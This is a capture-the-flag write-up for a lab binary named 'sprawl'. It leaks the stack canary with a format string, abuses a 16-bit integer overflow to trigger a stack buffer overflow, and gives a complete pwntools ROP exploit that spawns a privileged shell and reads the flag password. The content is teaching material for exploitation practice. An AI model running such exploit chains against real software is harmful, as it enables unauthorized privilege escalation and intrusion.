Checking the binary protections:

```sh
level07@rainfall:~$ checksec sprawl
[*] '/home/level07/sprawl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

Decompiling the binary reveals two core stages to achieve code execution: leaking the stack canary via a format string, followed by an integer overflow that triggers a stack-based buffer overflow.

### Canary Leak via Format String

The `route_tag` function contains a direct format string vulnerability:

```c
void route_tag() {
    char buff[128];
    printf("[SPRAWL] Route tag: ");
    fflush(stdout);
    fgets(buff, sizeof(buff), stdin);
    printf("[SPRAWL] Routing via ");
    printf(buff); // Format string vulnerability
    fflush(stdout);
}

```

Disassembly of `route_tag`:

```assembly
(gdb) disass route_tag
Dump of assembler code for function route_tag:
   0x00000000004012fe <+0>:     endbr64
   0x0000000000401302 <+4>:     push   %rbp
   0x0000000000401303 <+5>:     mov    %rsp,%rbp
   0x0000000000401306 <+8>:     sub    $0x90,%rsp

```

With `0x90` bytes allocated on the stack, the canary sits at `RBP - 0x8` (`0x88` bytes offset). Accounting for the 6 register arguments in the x86-64 calling convention:

$$\text{Canary Offset} = \frac{0x90 - 8}{8} + 6 = \frac{136}{8} + 6 = 17 + 6 = 23$$

Sending `%23$p` leaks the active canary value.

### Header Validation & Integer Overflow

In `process_packet`, the program parses three header fields (`magic`, `count`, `size`):

```c
// sprawl.c#L30-L32
if (hdr->magic != 0xDEADBEEF) {
    return -1;
}
...
// sprawl.c#L43-L46
if (read_header(&hdr) < 0) {
    puts("[SPRAWL] Invalid header.");
    return;
}

```

Passing `magic = 0xDEADBEEF` satisfies the header validation check. Next, the binary calculates the buffer size using 16-bit arithmetic:

```c
// --- VULNERABILITY 1: Integer Overflow ---
// count (16-bit) * size (16-bit) truncated to 16-bit unsigned short
total_size = (unsigned short)(hdr.count * hdr.size);

if (total_size > 64) { // 0x40
    puts("[SPRAWL] Frame too large for relay buffer.");
    return;
}
...
// --- VULNERABILITY 2: Stack Buffer Overflow ---
// Passing size = 0 makes total_size = 0 (0 <= 64), while fread reads count bytes
fread(payload, 1, (size_t)hdr.count, stdin);

```

By providing `hdr.size = 0` and `hdr.count = 0xb0` (176 bytes), `total_size` evaluates to `0`, bypassing the size check (`0 <= 64`). The subsequent `fread` reads `0xb0` bytes into the stack buffer.

We overwrite the buffer with 72 bytes of padding, restore the leaked canary, append 8 bytes for saved `RBP`, and place our ROP chain to execute `setreuid(1024, 1024)` (`flag07`), `system("/bin/sh")`, and `exit(3)`.

**`exploit.py`:**

```python
from pwn import *
import sys

libc = 0x7ffff7c00000

# ROP Gadgets
ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x000000000002882f)  # ret (16-byte stack alignment)

# Functions & Strings
ROP_SH       = p64(libc + 0x00000000001cb42f)
ROP_SYS      = p64(libc + 0x0000000000058750)
ROP_SETREUID = p64(libc + 0x00000000001271d0)
ROP_EXIT     = p64(libc + 0x0000000000047ba0)

OWNER_UID    = p64(1024)

# Build ROP Chain
rop_chain  = ROP_RDI + OWNER_UID
rop_chain += ROP_RSI + OWNER_UID
rop_chain += ROP_SETREUID
rop_chain += ROP_RDI
rop_chain += ROP_SH
rop_chain += ROP_SYS
rop_chain += ROP_RDI
rop_chain += p64(3)
rop_chain += ROP_EXIT

canary_payload = b"%23$p"

p = process("/home/level07/sprawl", env={})

# Step 1: Leak Stack Canary
p.recvuntil(b"[SPRAWL] Route tag: ")
p.sendline(canary_payload)

canary_string = p.recvline()[len(b"[SPRAWL] Routing via "):]
canary = int(canary_string, 16)

# Step 2: Bypass Header Constraints & Trigger Buffer Overflow
p.recvuntil(b"[SPRAWL] Header (hex): ")
magics = b"0xDEADBEEF 0xb0 0"
p.sendline(magics)

p.recvuntil(b"[SPRAWL] Transmit (0 bytes): ")

offset = 72
payload = b'\x00' * offset + p64(canary) + p64(0) + rop_chain
p.sendline(payload)
p.interactive()

```

**Execution & Flag Capture:**

```sh
level07@rainfall:~$ python3 exploit.py 
[+] Starting local process '/home/level07/sprawl': pid 2213
[*] Switching to interactive mode
[SPRAWL] Packet 0 received. Checksum: 00000000
$ whoami
flag07
$ cat /home/flag07/.pass
s3cgzrg5q78t6xx73ljvm3m2zfwk02ix

```